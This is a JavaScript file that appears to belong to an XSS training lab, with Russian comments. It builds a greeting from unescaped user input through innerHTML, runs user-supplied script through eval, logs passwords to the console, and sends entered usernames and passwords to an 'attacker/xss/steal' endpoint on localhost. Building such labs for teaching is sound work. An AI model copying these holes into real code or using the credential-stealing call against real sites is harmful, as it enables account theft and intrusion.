// ./app/xss/static/JS/script3.js
function displayUsername() {
    const usernameInput = document.getElementById('username').value;
    const passwordInput = document.getElementById('password').value;
    const greetingDiv = document.getElementById('greeting');

    greetingDiv.innerHTML = 'Привет, ' + usernameInput + '!';

    if (usernameInput && passwordInput) {
        const data = `username=${encodeURIComponent(usernameInput)}&password=${encodeURIComponent(passwordInput)}`;
        fetch('http://localhost:8080/attacker/xss/steal?' + data)
            .then(response => console.log('Данные отправлены'))
            .catch(error => console.error('Ошибка:', error));
    }
}



 function submitForm() {
        let payload = document.getElementById('xss-payload').value;
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        console.log('Raw Payload:', payload); // Отладка: выводим сырой пейлоад
        console.log('Username:', username); // Отладка: выводим введённое имя
        console.log('Password:', password); // Отладка: выводим пароль

        // Извлекаем содержимое между <script> и </script>
        const scriptMatch = payload.match(/<script>([\s\S]*?)<\/script>/i);
        if (scriptMatch && scriptMatch[1]) {
            payload = scriptMatch[1].trim();
            console.log('Extracted JavaScript:', payload); // Отладка: выводим извлечённый код
        } else {
            console.error('Пейлоад не содержит <script> или некорректен');
            return;
        }

        // Выполняем пейлоад
        try {
            if (payload) {
                eval(payload); // Выполняем только JavaScript-код
            } else {
                console.error('Пейлоад пустой после обработки');
            }
        } catch (e) {
            console.error('Ошибка выполнения пейлоада:', e);
        }

        // Отображаем приветствие (если данные введены)
        const greetingDiv = document.getElementById('greeting');
        if (username) {
            greetingDiv.innerHTML = 'Привет, ' + username + '!';
        }
    }